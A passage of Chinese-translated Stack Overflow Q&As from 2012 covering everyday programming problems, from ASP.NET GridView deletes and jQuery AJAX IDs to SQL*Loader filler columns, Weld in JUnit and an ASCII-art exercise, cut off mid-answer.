> 时间：2012-10-25T19:52:57.650
> 
> 标签：c#, c#-4.0, gridview

我有一个 GridView ，其中包含我数据库中的一些数据。

但是，当悬停删除链接时，它会链接到不正确的 ID。

我希望它使用数据库中的 ID。

[这个问题与这个](https://stackoverflow.com/questions/9353429/deleting-records-from-gridview-and-db-using-check-box-and-delete-button)问题非常相关- 但它从未得到答案。

我的`GridView`代码如下所示：

```
<asp:GridView ID="GridView1" runat="server" OnRowDeleting="GridView1_RowDeleting1" AutoGenerateColumns="false" DataKeyNames="id">
    <Columns>
      <asp:BoundField HeaderText="Name" DataField="name" />
      <asp:BoundField HeaderText="Email" DataField="email" />
      <asp:BoundField HeaderText="Comment" DataField="comment" />
      <asp:CommandField ShowDeleteButton="True"  />
    </Columns>
</asp:GridView> 
```

如何创建`DeleteButton`指向正确 ID 的链接？

## **更新**

*将数据放入数据表的页面加载代码：*

```
 protected void Page_Load(object sender, EventArgs e)
    {
        DataTable commentsTable = null;
        commentsTable = new DataTable("Comments");
        using (SqlDataReader reader = studentManager.getCommentsFromDB())
        {
            commentsTable.Load(reader);
            GridView1.DataSource = commentsTable;
            GridView1.DataBind();
        }
    } 
```

*从数据库获取评论：*

```
 public SqlDataReader getCommentsFromDB()
    {
        SqlConnection conn = dal.connectDatabase();
        conn.Open();
        cmd = new SqlCommand(@"SELECT id, name, email, comment FROM GuestBook", conn);
        rdr = cmd.ExecuteReader();
        return rdr;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:21:35.623

有很多方法可以做到这一点。我倾向于使用 ASP.NET 按钮并将`CommandName`属性设置为`"Delete"`.

```
<asp:Button ID="btnDelete" runat="server" CommandName="Delete" /> 
```

或者

```
<asp:ImageButton ID="ibtnDelete" runat="server" ImageUrl="~/Images/Delete.gif" CommandName="Delete" /> 
```

或者

```
<asp:CommandField ButtonType="Button" DeleteText="Delete" ShowDeleteButton="true" /> 
```

然后只需将处理的事件连接起来即可`OnRowDeleting`。

```
protected void GridView1_RowDeleting1(object sender, GridViewDeleteEventArgs e) {
    // Get the id
    string id = GridView1.DataKeys[e.RowIndex].Value.ToString();

    // Create the delete query
    string sql = @"delete from GuestBook where id = @id";

    using (SqlConnection conn = dal.connectDatabase()) {

        cmd = new SqlCommand(sql, conn);
        cmd.Parameters.Add("@id", SqlDbType.Int);
        cmd.Parameters["@id"].Value = id;

        try {
            conn.Open();
            cmd.ExecuteScalar();
        }
        catch (Exception ex) {
            Console.WriteLine(ex.Message);
        }
    }

    // Refresh the GridView1
    Bind_GridView1();
} 
```

...以及每次要刷新`GridView`. 将`GridView`绑定调用放在它自己的方法中会更简洁，您可以从页面中的任何位置调用它（这意味着您也可以从页面加载事件中调用它）。

```
public void Bind_GridView1() {
        DataTable commentsTable = null;
        commentsTable = new DataTable("Comments");
        using (SqlDataReader reader = studentManager.getCommentsFromDB())
        {
            commentsTable.Load(reader);
            GridView1.DataSource = commentsTable;
            GridView1.DataBind();
        }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:12:39.397

尝试添加`<asp:BoundField DataField="id" ReadOnly="True" Visible="false" />`

您可能还必须明确定义`DataTable`您正在使用的`DataSource`

定义数据表

```
 DataTable dt = new DataTable();
        DataColumn col = new DataColumn()
        {
            ColumnName = "id"
        };
        dt.Columns.Add(col);
        col = new DataColumn()
        {
            ColumnName = "name"
        };
        dt.Columns.Add(col); 
```

并继续您需要的每一列

# android - 如何在 onContextItemSelected() 中检索 ID

> ID：13076170
> 
> 赞同：2
> 
> 时间：2012-10-25T19:53:07.633
> 
> 标签：android, contextmenu

我需要`onContextItemSelected()`. 我使用以下代码：

```
@Override
public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
    if (v.getId()==R.id.listView1) {
        AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo)menuInfo;
        menu.setHeaderTitle("Optionen");
        menu.add(Menu.NONE, info.position, 0, "Artikel entfernen");
    }
}

@Override
public boolean onContextItemSelected(MenuItem item) {       
    final ListView lv = (ListView)findViewById(R.id.listView1);
    Toast.makeText(getApplicationContext(), lv.getItemAtPosition(item.getItemId()).toString(), Toast.LENGTH_LONG).show();
    return true;
} 
```

`info.position`无法从with`onContextItemSelected`读取var `item.getItemId`！该应用程序崩溃并显示日志：*String empty*。你能找出错误吗？谢谢！

**更新** 我将代码更改为：

```
@Override
public void onCreateContextMenu(ContextMenu menu, View v,
    ContextMenuInfo menuInfo) {
    if (v.getId()==R.id.listView1) {
    AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo)menuInfo;
    menu.setHeaderTitle("Optionen");
    menu.add(Menu.NONE, info.position, 0, "delete post");
  }
}

@Override
public boolean onContextItemSelected(MenuItem item) {

  final ListView lv = (ListView)findViewById(R.id.listView1);
  //lv.getItemAtPosition(0).toString()

  AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo)item.getMenuInfo();

  Toast.makeText(getApplicationContext(), info.position, Toast.LENGTH_LONG).show();
  //Toast.makeText(getApplicationContext(), lv.getItemAtPosition(item.getItemId()).toString(), Toast.LENGTH_LONG).show();

  return true;
} 
```

但是这段代码也不起作用（NotFoundException）。我有一个包含项目的列表视图（R.id.listView1）。如果用户长时间单击某个项目，则会出现上下文菜单。有“删除帖子”选项。然后我需要帖子中的ID来删除它！

还有其他解决方案吗？

**更新 2** 我解决了这个问题：

```
Toast.makeText(getApplicationContext(), lv.getItemAtPosition(info.position).toString(), Toast.LENGTH_LONG).show(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T06:32:24.620

`info.id`将是`id`与`AdapterView`.

要进入`info`，`onContextItemSelected()`请使用：

```
AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo)item.getMenuInfo(); 
```

另外，请注意上下文菜单变得越来越不流行，有利于带有操作栏的操作模式（也称为上下文操作栏）。

# python - 在python中返回函数名？

> ID：13076172
> 
> 赞同：2
> 
> 时间：2012-10-25T19:53:19.760
> 
> 标签：python, function

做一个类型的数学函数`def`。

```
def integral_error(integral,f):
    ------stufff-------
    print integral 
```

给出类似的东西：`'<function simpsons at 0xb7370a74>'`

有没有办法在没有字符串操作的情况下获得辛普森一家？即只是函数名？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T19:55:52.503

您可以使用：

```
integral.func_name 
```

或者：

```
integral.__name__ 
```

虽然，它们是完全等价的。根据[文档](http://docs.python.org/reference/datamodel.html)：

> `__name__`是 func_name 的另一种拼写方式

这是一个示例代码：

```
>>> def f():
    pass

>>> f.__name__
'f'
>>> f.func_name
'f'
>>> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T19:55:12.893

您可以使用`integral_error.__name__`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-25T19:55:45.243

你可以`__name__`这样使用`integral.__name__`

# php - 通过ajax表单发送id

> ID：13076173
> 
> 赞同：10
> 
> 时间：2012-10-25T19:53:22.103
> 
> 标签：php, javascript, jquery

我有几个表单元素，当点击更新数据库并消失时。

起初，我有一个显示签入的按钮。单击它后，数据库将更新，并显示一个下拉列表来代替按钮。在下拉列表中，有一些位置供用户选择，它们具有相应位置编号的值，单击更新数据库即可。最后一个选项被标记为签出，单击它后，数据库应该最后一次更新，然后应该出现红色文本说签出。

问题是，上述过程有多组（意味着有许多 Check In 按钮，它们变成选择然后读取**Checked Out**，它们都单独工作）。所以我需要一种在更新数据库的同时将每个集合的 id 传递给数据库的方法。我在想每个按钮下面的隐藏字段，它填充了 id，然后当单击**Check In**按钮时，ajax 会发送隐藏字段吗？

这是我的html：

```
<button class="checkIn">Check In</button>

<form method='post' class='myForm' action=''>
  <select name='locationSelect' class='locationSelect'>
     <option value='1'>Exam Room 1</option>
     <option value='2'>Exam Room 2</option>
     <option value='3'>Exam Room 3</option>
     <option value='4'>Exam Room 4</option>
     <option value='CheckOut'>Check Out</option>
  </select>
</form> 
```

这是jquery

```
<script src="http://code.jquery.com/jquery-1.8.2.js"></script>

<script type="text/javascript">
$(document).ready(function() {    
    $('.locationSelect').hide();
    $('.finished').hide();
});

$('.checkIn').click(function(){
    $e = $(this);
    $.ajax({
    type: "POST",
    url: "changeloc.php",
    data: "checkIn="+$(this).val(),
    success: function(){
      $('.checkIn').css("display","none");
              $('.locationSelect').show();        
         }
    });
});

$('.locationSelect').change(function(){
    $e = $(this);
    $.ajax({
       type: "POST",
       url: "changeloc.php",
       data: "locationSelect="+$(this).val(),
       success: function(){

       }
    });
});
$('.locationSelect option[value="CheckOut"]').click(function(){
    $e = $(this);
    $.ajax({
       type: "POST",
       url: "changeloc.php",
       data: "checkOut="+$(this).val(),
       success: function(){
       $('.locationSelect').css("display","none");
       $('.finished').show();
       alert('done');
       },
       error: function(request){
       alert(request.responseText);
       }
    });
});

</script> 
```

我不确定我的解决方案是否可行，因此请随时提出其他解决方案。如果您需要任何其他详细信息，请尽管询问！

感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T19:55:20.133

发送到服务器时，将数据以`map`..对的形式发送会更简洁。`(Key : value )`

而不是这个

```
data: "checkIn="+$(this).val(), 
```

尝试以这种方式发送

```
data: { "checkIn" :  $(this).val() } , 
```

**编辑**

要执行此逻辑，您首先**不需要使用隐藏的输入字段**。我更喜欢使用**HTML5 data-* 属性**来完成工作。这也通过了 HTML 验证...

让我们假设按钮和表单在另一个之下。然后你可以给按钮一个名为**button-1**的数据属性 和对应选择的**select-1** 。

**HTML**看起来像这样..

```
<button class="checkIn" data-param="button-1">Check In</button>

<form method='post' class='myForm' action=''>
  <select name='locationSelect' class='locationSelect' data-param="location-1">
     <option value='1'>Exam Room 1</option>
     <option value='2'>Exam Room 2</option>
     <option value='3'>Exam Room 3</option>
     <option value='4'>Exam Room 4</option>
     <option value='CheckOut'>Check Out</option>
  </select>
</form>
<div class="finished" >
    Checked Out
</div>

<button class="checkIn" data-param="location-2">Check In</button>

<form method='post' class='myForm' action=''>
  <select name='locationSelect' class='locationSelect' data-param="location-2">
     <option value='1'>Exam Room 1</option>
     <option value='2'>Exam Room 2</option>
     <option value='3'>Exam Room 3</option>
     <option value='4'>Exam Room 4</option>
     <option value='CheckOut'>Check Out</option>
  </select>
</form>
<div class="finished" >
    Checked Out
</div>
..... 
```

**Javascript**

```
$(document).ready(function() {
    $('.locationSelect').hide();  // Hide all Selects on screen
    $('.finished').hide();        // Hide all checked Out divs on screen

    $('.checkIn').click(function() {
        var $e = $(this);
        var data = $e.data("param").split('-')[1] ;
        // gets the id  of button  (1 for the first button)
        // You can map this to the corresponding button in database...
        $.ajax({
            type: "POST",
            url: "changeloc.php",
            // Data used to set the values in Database
            data: { "checkIn" : $(this).val(), "buttonid" : data},
            success: function() {
                // Hide the current Button clicked
                $e.hide();
                // Get the immediate form for the button
                // find the select inside it and show...
                $e.nextAll('form').first().find('.location').show();
            }
        });
    });

    $('.locationSelect').change(function() {
        $e = $(this);
        var data = $e.data("param").split('-')[1] ;
        // gets the id  of select (1 for the first select)
        // You can map this to the corresponding select in database...
        $.ajax({
            type: "POST",
            url: "changeloc.php",
            data: { "locationSelect" : $(this).val(), "selectid" : data},
            success: function() {
                // Do something here
            }
        });
    });
    $('.locationSelect option[value="CheckOut"]').click(function() {
        var $e = $(this);
        var data = $e.closest('select').data("param").split('-')[1] ;
        // gets the id  of select (1 for the first select)
        // You can map this to the corresponding select in database...
        // from which checkout was processed
        $.ajax({
            type: "POST",
            url: "changeloc.php",
            data: { "checkOut" : $(this).val(), "selectid" : data},
            success: function() {
                // Get the immediate form for the option
                // find the first finished div sibling of form
                // and then show it..
                $e.closest('form').nextAll('.finished').first().show();
                // Hide the current select in which the option was selected
                $e.closest('.locationSelect').hide();
                alert('done');
            },
            error: function(request) {
                alert(request.responseText);
            }
        });
    });
});​ 
```

我已将大部分逻辑编写为代码中的注释。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-29T21:18:33.127

因此，根据我对您在此处提出的问题的理解，您在不同的考场中拥有该 HTML 的多个实例？如果是这种情况，请为按钮或父包装器提供您想要的 id，以便以某种方式将其与您尝试更新的数据库中的行相关联。您不需要隐藏字段，只需为按钮提供带有所需 id 键的数据属性即可。对于这个例子，让我们称之为`group_1`。

因此，将组包装在您的 HTML 中：

```
<div class='group' id='group_1'>
    <button class="checkIn">Check In</button>

    <form method='post' class='myForm' action=''>
      <select name='locationSelect' class='locationSelect'>
         <option value='1'>Exam Room 1</option>
         <option value='2'>Exam Room 2</option>
         <option value='3'>Exam Room 3</option>
         <option value='4'>Exam Room 4</option>
         <option value='CheckOut'>Check Out</option>
      </select>
    </form>
</div> 
```

单击按钮时，获取父包装器 ID：

```
$('.checkIn').click(function(){
    var id = $(this).parent('.group').attr('id');
    $.ajax({
    type: "POST",
    url: "changeloc.php",
    data: "checkIn="+$(this).val()+"&group="+id,
    success: function(){
      $('.checkIn').css("display","none");
      $('.locationSelect').show();

    }
    });
}); 
```

然后，在服务器端，使用某种逻辑更新您的数据库，该逻辑使用您在 AJAX 中发送的第二个数据值确定您要更新的组。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-29T18:07:16.453

我会把它写成：

```
post_data = $(this).val();

$.ajax({
    type: "POST",
    url: "changeloc.php",
    data: "checkIn=" + post_data,
    success: function(){
      $('.checkIn').css("display","none");
      $('.locationSelect').show();
    }
}); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-02T16:16:02.110

我一直在使用动态表单，我强烈建议您利用 HTML 元素的数据属性。

从 PHP 中的循环生成的示例 HTML：

```
<button class="checkIn" data-group-id='{$group->id}'>Check In</button>

<select name='locationSelect' data-group-id='{$group->id}' class='locationSelect'>
   <option value='1'>Exam Room 1</option>
   <option value='2'>Exam Room 2</option>
   <option value='3'>Exam Room 3</option>
   <option value='4'>Exam Room 4</option>
   <option value='CheckOut'>Check Out</option>
</select> 
```

Javascript：

```
<script type="text/javascript">
$(function() {    
    $('.locationSelect').hide();
    $('.finished').hide();
});

$('.checkIn').click(function(){
    var group_id = $(this).data('group-id'),

    $.post('changeloc.php', {checkIn: group_id}, function(){
        $(this).hide();
        $('.locationSelect[data-group-id="' + group_id + '"').show();
    }
});

$('.locationSelect').change(function(){
    $.post('changeloc.php', {locationSelect: $(this).val()}, function(){
        // Do something here
    }
});

$('.locationSelect').change(function(){
    if ($(this).val() == 'CheckOut') {
        var group_id = $(this).data('group-id');

        $.post('changeloc.php', {checkOut: group_id}, function(data){
            // If you're getting unexpected behavior do console.log(data);
            $('.locationSelect[data-group-id="' + group_id + '"').hide();
            $('.finished').show();
            alert('done');
        }
    }
});
</script> 
```

希望这可以帮助！我感觉你在编写原始 PHP，如果是这样，我建议你查看一些 OOP 框架。（个人最爱：laravel）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-03T21:51:42.277

为什么不简单地给每组表单元素一个数组名呢？

```
<button name="btn_checkin[1]" class="checkIn">Check In</button>

<form method='post' name="myForm[1]" class='myForm' action=''>
<select name='locationSelect[1]' class='locationSelect'>
    <option value='1'>Exam Room 1</option>
     <option value='2'>Exam Room 2</option>
     <option value='3'>Exam Room 3</option>
     <option value='4'>Exam Room 4</option>
     <option value='CheckOut'>Check Out</option>
</select>
</form> 
```

服务器端您将拥有一个数组，例如：

```
$valueOfLocationSelect1 = $_POST['locationSelect'][1]; 
```

也许有帮助

# objective-c - 连接可变数量字符串的宏

> ID：13076174
> 
> 赞同：2
> 
> 时间：2012-10-25T19:53:24.687
> 
> 标签：objective-c, ios, macros

我写这个来连接两个字符串：

```
#define Append(x, y) [NSString stringWithFormat:@"%@%@",x,y] 
```

但是，如果我有不止两个 NSString 对象怎么办。有没有办法修改它以适用于任意数量的字符串值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:45:11.023

必须是宏吗？如果你可以使用一个方法，这个怎么样：

```
- (NSString*)concatenateStrings:(NSString*)string, ...
{
    NSString* result = string;

    va_list args;
    va_start(args,string);

    NSString* arg;
    while((arg = va_arg(args,NSString*)))
        result = [result stringByAppendingString:arg];

    va_end(args);

    return result;
} 
```

你会打电话给类似的东西：

```
NSString* result = [self concatenateStrings:@"ABC",@"DEF",@"GHI",nil]; 
```

请记住以 nil 终止参数列表。

# sencha-touch - Sencha Touch 2 Ext.List 组件可以有子组件而不是在 itemTpl 属性中使用 HTML 吗？

> ID：13076175
> 
> 赞同：1
> 
> 时间：2012-10-25T19:53:26.840
> 
> 标签：sencha-touch, sencha-touch-2

我想在每个列表项中有一个包含交互式组件的列表，例如可以切换隐藏状态的多个按钮和标签。这可能吗？

我们基本上想要一个手风琴式列表，允许您展开每个列表项并显示该项目的详细视图。展开的视图可能有多个动作，每个动作都需要不同的按钮。

作为一种解决方法，我们只有一个带有 vbox 布局的面板。这基本上是可行的，但似乎我们失去了拥有列表的很多好处。这是唯一可能的解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T22:36:11.780

我以前也遇到过这种情况，我用[带有项目的数据视图替换了我的列表](http://docs.sencha.com/touch/2-0/#!/api/Ext.dataview.DataView-cfg-items)

# sql - 使用 SQL Loader 时如何跳过第一列？

> ID：13076182
> 
> 赞同：1
> 
> 时间：2012-10-25T19:54:09.773
> 
> 标签：sql, sql-loader

我得到一个 .csv 文件，其中包含 18 列无用数据，然后是 10 列有用数据，然后是另一列无用数据。有没有办法只抓取 10 列有用的数据而跳过其余的？我只想从第 19 列开始阅读文件并在第 29 列结束。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T19:57:06.943

你必须使用`filler`：

```
LOAD DATA
INFILE file.csv
INTO TABLE test_sqlldr
APPEND
FIELDS TERMINATED BY ';'
TRAILING NULLCOLS
( 
  col1 filler,
  col2 filler,
  ...
  col18 filler,
  col19,
  col20,
  ...
  col29
) 
```

[在这里](http://docs.oracle.com/cd/B10500_01/server.920/a96652/ch05.htm)您可以找到更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T09:04:05.457

使用 MySQL 将是：

```
LOAD DATA
INFILE file.csv
INTO TABLE test_sqlldr
APPEND
FIELDS TERMINATED BY ';'
TRAILING NULLCOLS
( 
  @ignore,
  @ignore,
  ...
  @ignore,
  col19,
  col20,
  ...
  col29
) 
```

# javascript - 为什么要提交此表格？

> ID：13076186
> 
> 赞同：-2
> 
> 时间：2012-10-25T19:54:18.973
> 
> 标签：javascript, html

我有以下`html`页面。如果用户单击该按钮`quit`，它应该会转发到一个`Goodbye.html`页面。

```
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <title>Answers</title>
</head>
   <script type="javascript/text">    
    function quit()
    {
        window.location = "www.google.com";      
    }    
   </script>
<body>
  <form enctype="application/x-www-form-urlencoded">
    <h1>Answers<br></h1>

    <h2><font color="#0033CC">Instant Psychology</font></h2>

    <blockquote>
      <h1><font color="#CC6600">Perfectionist<br></font></h1>
    </blockquote>

    <h2><font color="#CC0000">Instant Geography</font></h2>

    <blockquote>
      <h1><font color="#009900">Hawaii<br></font></h1>
    </blockquote>

    <h2><font color="#660033">Instant Gastronomy</font></h2>

    <blockquote>
      <h1><font color="#FF66FF">Souffle<br>
      <br>
      <br>
      <input type="submit" name="another" value="Do Another One" onclick="doanother();">
      <input type="submit" name="quit" value="Quit" onclick="quit();"></font></h1>
    </blockquote>
  </form>

</body><link rel="stylesheet" type="text/css" href="data:text/css,"></html> 
```

为什么页面会转到初始页面呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:10:07.180

如果您希望按钮执行您创建的任何功能并且不使用它们的默认提交功能，那么您应该更改您的代码：

```
<input type="submit"> 
```

到：

```
<input type="button"> 
```

默认情况下`type="submit"`提交表单。你也可以只使用：

```
return false; 
```

在您的 JavaScript 函数中，以防止它执行默认的提交操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T19:56:29.663

您可以使用阻止表单提交`return false;`

```
function quit()
{
    window.location = "www.google.com";  
    return false;
} 
```

# tumblr - Tumblr 中的自定义 ParmaLink

> ID：13076188
> 
> 赞同：1
> 
> 时间：2012-10-25T19:54:22.373
> 
> 标签：tumblr, permalinks

是否可以使用 newDayDate“标签”在 Tumblr 中拥有自定义永久链接？除了[现有的永久链接格式，我还希望在发布永久链接（](http://subdomain.tumblr.com/post/3434343/title-title)[例如](http://subdomain.tumblr.com/post/2012/10/24/title-title)）中包含年/月/日，就像 WordPress 默认永久链接格式一样。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T02:16:10.207

我联系了 Tumblr 支持并收到了他们的以下回复：

> 抱歉，目前不支持此功能。我们的歉意。我们将与我们的团队分享您对该功能的渴望。

# java - 如何在 JUnit 测试中引导weld-se

> ID：13076189
> 
> 赞同：4
> 
> 时间：2012-10-25T19:54:24.047
> 
> 标签：java, junit, cdi, weld

我有一个用于单元测试的 Maven 项目，并且想使用 CDI。我将weld-se依赖项放在pom.xml中，如下所示：

```
<dependency>
    <groupId>junit</groupId>
    <artifactId>junit</artifactId>
    <version>4.10</version>
</dependency>
<dependency>
    <groupId>org.jboss.weld.se</groupId>
    <artifactId>weld-se</artifactId>
    <version>1.1.8.Final</version>
</dependency>
<dependency>
    <groupId>javax.enterprise</groupId>
    <artifactId>cdi-api</artifactId>
    <version>1.0-SP3</version>
</dependency> 
```

我在 JUnit 测试运行器中引导焊接：

```
public class WeldJUnit4Runner extends BlockJUnit4ClassRunner {
   private final Class klass;
   private final Weld weld;
   private final WeldContainer container;

   public WeldJUnit4Runner(final Class klass) throws InitializationError {
       super(klass);
       this.klass = klass;
       this.weld = new Weld();
       this.container = weld.initialize();
   }

   @Override
   protected Object createTest() throws Exception {
       final Object test = container.instance().select(klass).get();

       return test;
   }
} 
```

还有一个使用这个运行器的单元测试。该测试正在注入一个应用程序范围的 bean。问题是由于对唯一注入点的“不满足的依赖关系”，焊接无法初始化，就好像我的应用程序范围的 bean 完全未知焊接一样。但是那个 bean 在我的测试中位于 src/test/java/... 中（但在另一个 java 包中）。

我在 src/test/resources 中有一个空的 beans.xml。

我注意到weld在启动时会发出警告，但我认为这些不是我的问题的原因：

```
604 [main] WARN org.jboss.weld.interceptor.util.InterceptionTypeRegistry - Class 'javax.ejb.PostActivate' not found, interception based on it is not enabled
605 [main] WARN org.jboss.weld.interceptor.util.InterceptionTypeRegistry - Class 'javax.ejb.PrePassivate' not found, interception based on it is not enabled 
```

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-03-18T08:56:12.907

看看[CDI-Unit](http://jglue.org/cdi-unit-user-guide/)。它`Runner`为 JUnit 测试类提供了一个：

> ```
> @RunWith(CdiRunner.class) // Runs the test with CDI-Unit
> class MyTest {
>     @Inject
>     Something something; // This will be injected before the tests are run!
> 
>     ...
> } 
> ```

来源：[CDI-Unit 用户指南](http://jglue.org/cdi-unit-user-guide/)。

CDI-Unit 还会记录以下警告，但尽管它运行良好：

```
WARN (InterceptionTypeRegistry.java) - WELD-001700: Interceptor annotation class javax.ejb.PostActivate not found, interception based on it is not enabled
WARN (InterceptionTypeRegistry.java) - WELD-001700: Interceptor annotation class javax.ejb.PrePassivate not found, interception based on it is not enabled 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-26T04:48:02.013

需要注意的几件事：用于[Arquillian](http://arquillian.org/modules/weld-se-embedded-1.1-container-adapter/)或[DeltaSpike CdiCtrl 模块的 Weld SE 容器](https://cwiki.apache.org/DeltaSpike/temporary-documentation.html#TemporaryDocumentation-CdiControlModule)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-30T17:13:11.923

Add the following `beans.xml` to the `src/test/resources/META-INF` directory:

```
<beans xmlns="http://xmlns.jcp.org/xml/ns/javaee" 
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/beans_1_1.xsd"
    version="1.1" bean-discovery-mode="all">
</beans> 
```

The reason for the warnings: Classes `javax.ejb.PostActivate` and `javax.ejb.PrePassivate` were not found. You are missing a dependency.

Add this dependency to your pom.xml:

```
<dependency>
    <groupId>javax.ejb</groupId>
    <artifactId>javax.ejb-api</artifactId>
    <version>3.2</version>
</dependency> 
```

Regards.

# apache-flex - 启用的 adobe flex vbox 仅第二次工作

> ID：13076193
> 
> 赞同：0
> 
> 时间：2012-10-25T19:54:34.377
> 
> 标签：apache-flex

我有一种情况，我正在使用数据网格（灵活），当我选择行时，我想启用/禁用网格下方的窗格。如果我选择了 1 行，我希望它启用，如果我选择了 0 行或多于 1 行，我希望它禁用。该窗格最初被禁用，并且启用在 100% 的时间里都很好。 `enabled="false"`只有在我选择了三行后才有效。如果我选择了两行，我可以证明我将其设置为 false，但它不需要。

我试过`invalidateDisplayList`了，触发一个事件来设置`enabled="false"`第二次。似乎没有任何效果。

如果这有什么不同，我正在一个模块中工作。如果我设置`AlertInfoPanel.enabled=false`，它并不总是有效。

```
<mx:VBox>
<flexi:myGrid />
</mx:VBox>

<mx:VBox id="AlertInfoPanel" height="70%" width="100%" visible="{mAllowConfig}"  includeInLayout="{mAllowConfig}" enabled="false" >
     <mx:TabNavigator width="100%" height="100%" paddingTop="0" tabHeight="20" id="TAB_NAVIGATOR" >
                        <components:Tab1 label="{getToken('token_tab_general')}" id="generalInfoUI"/>
                        <components:Tab2 label="{getToken('token_tab_rules')}" />
     </mx:TabNavigator>
</mx:VBox> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T16:55:19.757

我终于弄明白了。我需要打电话`AlertInfoPanel.validateNow()`。

我不明白为什么它有时会起作用，但是`validateNow()`VBOX 上的似乎起作用了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T04:49:55.987

试试这个

```
<mx:VBox id="AlertInfoPanel" height="70%" width="100%" visible="{mAllowConfig}" 
   includeInLayout="{mAllowConfig}" enabled="{myGrid.selectedItems.length==1}" /> 
```

# python - Python中的ASCII艺术

> ID：13076194
> 
> 赞同：17
> 
> 时间：2012-10-25T19:54:35.627
> 
> 标签：python, ascii

我对 python 很陌生，把它当作一种爱好，通过一些搜索发现自己有一堆来自“*计算实践*”的练习，其中一个询问关于编写一个 ASCII 数字，如下所示。

![ASCII交叉](../Images/90236cf14460aa70fd5e6ba8f7bf071a.png)

这一切似乎都是一个简单的练习，但我似乎无法用数字来画这个，练习表明上面的画是通过使用数字“1”绘制的。

它还指出，任何小于 0 或大于 100 的数字都不能或不应该用于创建 ASCII 图形。

这是另一个例子：

这里的输入是数字“2”。

![更大的ASCII交叉](../Images/7c55b5344ed620be1612938bff527957.png)

我找到了一种让第一张图片出现的方法，但不是通过以任何方式使用给定的数字，只是在 while 循环中使用一个简单的“else”，这样我就可以过滤掉小于或等于 0 的数字并且大于或等于 100。

我已经死机了。

如上所述，我的代码不使用变量号来创建第一幅图：

```
while True:
s = input("Give me a number to make a drawing with that is between 0 and 100: ")

if not s.isdigit():
    print ("Error, only numbers will make this program run.")
    continue #Try Again but with a number this time

if int(s) >= 100:
    print ("The number is bigger than or equal to 100 and won't work. \nDo try again.")
    continue #try again

if int(s) <= 0:
    print ("The number is smaller than or equal to 0 and won't work. \nDo try again.")
    continue #try again

else:
    print ("%5s" %("*" *3),"\n"'%5s' %("* *"),"\n" '%7s' %("*** ***"),"\n" '%7s' %("*     *"),"\n" '%7s' %("*** ***"),"\n" '%5s' %("* *"),"\n" '%5s' %("*" *3))

    print ('Want to make another drawing ?')
    continue #make another drawing 
```

**练习陈述如下：**

大小为 $n$ 的 ASCII 图形由一行或几行组成。在每一行上只允许空格和星号 (*)，在一行上的每个星号之后不允许有空格，因此您应该以“\n”或换行符结尾。然后是上述示例。

**我的新代码示例取决于变量输入：** *此外，在此代码示例中，它设置为在输入为 1 时触发，当我增加输入数字时，我仍然遇到“放大”整个图形的问题。*

```
 while True:

 A = input("Give me a number to make a drawing with that is between 0 and 100: ")
 b = "***"
 c = "*"
 d = " "

 if not A.isdigit():
        print ("Error, only numbers will make this program run.")
        continue #Try Again but with a number this time

 if int(A) >= 100:
        print ("The number is bigger than or equal to 100 and won't work. \nDo try again.")
        continue #try again

 if int(A) <= 0:
        print ("The number is smaller than or equal to 0 and won't work. \nDo try again.")
        continue #try again

 else :
  range(1,99)
 if int(A) == (1) :
  print ((d *((int(A))*2)) + b,)
  print ((d *((int(A))*2))+ c + d + c,)
  print ((d *((int(A))*0))+ b + d + b,)
  print ((d *((int(A))*0))+ c + d*5 + c,)
  print ((d *((int(A))*0))+ b + d + b,)
  print ((d *((int(A))*2))+ c + d + c,)
  print ((d *((int(A))*2)) + b,)

  continue #try again 
```

但是我仍然有一个问题，即 ASCII 数字内的空格数量随着 1 到 2 的增加而“增加”。

因为我对第 3 行也有问题，因为它需要沿着控制台的侧面表示，它应该与侧面有 0 的间距，但它必须增加到 2 的间距和数字 2 .

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-25T20:05:03.087

想想 1 和 2 之间的区别。试着用手画出 3 和 4 应该是什么样子才能使序列正常工作。把它想象成一个问题，你得到一个序列的开始，你必须处理剩下的问题。

喜欢：

0 1 1 2 3 5 8 13

如果你没有马上意识到，那就是斐波那契数列。一旦你弄清楚了模式，你就可以编写一个任意长的值序列。

想想这个简单的 ascii 序列：

1)

```
# 
```

2)

```
##
# 
```

3)

```
###
##
# 
```

4) 看起来像什么？

或另一个 ascii 序列：

1)

```
# 
```

2)

```
 #
# #
 # 
```

3)

```
